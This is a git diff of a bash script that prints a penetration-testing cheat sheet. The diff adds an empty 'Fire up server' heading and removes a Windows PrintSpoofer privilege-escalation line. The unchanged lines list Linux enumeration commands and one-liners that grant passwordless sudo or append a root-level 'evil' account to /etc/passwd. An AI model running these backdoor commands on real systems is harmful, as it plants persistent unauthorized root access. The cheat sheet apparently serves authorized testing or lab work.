@@ -39,6 +39,10 @@ echo -e "    \\\\\\$ip\\\share\\\file.exe ${Comment}# run executable${End}"
 echo -e ""
 
 
+echo -e "${Frame}###${End} ${Title}Fire up server${End} ${Frame}###${End}"
+
+
+
 echo -e "${Frame}###${End} ${Title}Linux Post Enum${End} ${Frame}###${End}"
 echo -e "${Point} ps aux | grep -i 'root' --color=auto ${Comment}# root processes${End}"
 echo -e "${Point} find / -perm -u=s -type f 2>/dev/null ${Comment}# SUID${End}"
@@ -50,10 +54,4 @@ echo -e "${Frame}###${End} ${Title}Linux PrivEsc Oneliner${End} ${Frame}###${End
 echo -e "${Point} echo \"<user> ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"
 echo -e "${Point} echo \"evil:\$(openssl passwd -1 evil):0:0:root:/root:/bin/bash\" >> /etc/passwd"
 echo -e ""
-
-
-echo -e "${Frame}###${End} ${Title}Windows PrivEsc Oneliner${End} ${Frame}###${End}"
-echo -e "${Point} .\PrintSpoofer64.exe -i -c cmd ${Comment}# exploit 'SeImpersonatePrivilege'${End}"
-echo -e ""
-
 
